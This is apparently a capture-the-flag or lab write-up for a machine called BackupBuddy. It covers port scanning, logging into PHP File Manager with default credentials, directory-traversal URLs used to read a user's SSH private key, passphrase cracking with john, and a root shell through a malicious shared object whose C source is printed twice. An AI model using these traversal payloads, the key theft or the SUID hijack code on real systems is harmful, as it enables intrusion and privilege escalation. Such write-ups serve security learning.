BackupBuddy

Target IP: 192.168.166.50
Challenge Description: N/A.

Reconnaissance


Performing a TCP port scan using the command sudo nmap -sS 192.168.166.43 -p- returns the result shown in the image above. There are two TCP ports open on the target machine: SSH and HTTP on their standard ports.


Performing an aggressive TCP port scan against the two TCP ports using the command sudo nmap -sV -A 192.168.166.43 -p 22,80 returns the result shown in the image above. The HTTP title of the web application on port 80 specifies it is PHP File Manager. Time to check this out.


Doing a scan against the web server for this web application returns the interesting information shown above. It mentions the interesting directories such as /files/ and the file /readme. It also mentions the web application is vulnerable to XSS attacks, but this could be false.

Enumeration

Port 80: HTTP

Before performing any directory search, I decided to check out the web application. The webpage above was returned to me. It informs me to login. I tried to login using standard default credentials such as admin:admin, admin:root, root:admin, and root:root, but I had no luck. The footer contains the name of the web application. When checking the source-code of the webpage, the footer redirects to this GitHub project.


It seems to be using the PHP File Manager application shown in the image above. I noticed the default credentials are fm_admin:fm_admin for this application. Maybe this default credentials will work if the administrator has not changed it?


And bingo, it worked. I managed to successfully login to the web application using the default credentials as shown in the image above. However, I am not able to upload anything. There is one folder called backup. Maybe this folder contains sensitive files? I also notice the owner of this file is brian. This user stands out to me.

Exploitation

Owning the PHP File Manager via Directory Traversal

However, I did not find any interesting files inside the backup folder. There is an image, but this was not helpful. One thing that stands out to me is the parameter p in the URL as it is calling the folder/file name. Is this web application vulnerable to directory traversal?


And it seems like it was I was able to perform directory traversal. Using the same parameter p, I was able to traverse to the main root directory on the web server. The full URL is http://192.168.166.43/index.php?p=..%2F..%2F..%2F..%2F..%2F%2F


From previous enumeration, I identified the user brian. I browsed to this user's home directory and I noticed the user's SSH keys are accessible as shown in the image above. I made a copy of the user's id_rsa on my machine. The full URL is http://192.168.166.43/index.php?p=..%2F..%2F..%2F..%2F..%2F%2Fhome%2Fbrian%2F.ssh.


Since the SSH key is passphrase protected, I ran the command ssh2john id_rsa > hash to obtain the passphrase hash. Then I cracked the passphrase hash using john by the command john hash --wordlist=/usr/share/wordlists/rockyou.txt. Afterwards, I changed the permission of the id_rsa to 400 to make it protected.


And using the command ssh brian@192.168.166.43 -i id_rsa, I gained an SSH foothold on the target machine as the user brian. Now I have a stable foothold. Time to elevate my privileges.

Privilege Escalation

Vertical Privilege Escalation: User brian to root via Shared Object Hijacking

Running the command find / -perm -u=s -type f 2>/dev/null returns the interesting output shown in the image above. The binary /opt/backup has SUID bit set. This means this binary can be run with higher privileges. I tried to run the binary, but it would crash right after.


Since I cannot execute the binary, I ran the command strings backup to identify any interesting strings inside the binary. Right away, I notice the /home/brian/.config/libm.so string. In Linux, any files that end in .so are Share-Objects. These are similar to DLLs on Windows machines. It allows developers to share code to for code reusability. I need to enumerate this binary further.


Running the command strace /opt/backup 2>&1 | grep -i -E "open|access|no such file" returns the output shown in the image above. The output mentions the binary backup is unable to find the libm.so file. Also, ld.so.preload is set. This is an easy privilege escalation as we can load a custom malicious .so file to obtain a root shell.


I browsed to the home directory of user brian. Then I created a directory called .config, as this is where the malicious shared object will be loaded from. Inside this directory, as shown in the image above, I created a file with the name libm.c that contains the following C code that is responsible for spawning a bash shell with root privileges:

#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

static void inject() __attribute__((constructor));

static void inject() {
    printf("Malicious library loaded\n");
    setuid(0);
    setgid(0);
    system("/bin/bash -i");
}
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

static void inject() __attribute__((constructor));

static void inject() {
    printf("Malicious library loaded\n");
    setuid(0);
    setgid(0);
    system("/bin/bash -i");
}


SInce gcc is already installed on the exploited machine, I compiled the C code using the command gcc -shared -fPIC -o libm.so libm.c. This command will output the .so file with the name libm.so. After the libm.so was created, I executed the command ./backup over at /opt/ to execute the binary. And bingo. I obtained a root shell right away. Now I have root privileges over the target machine :)
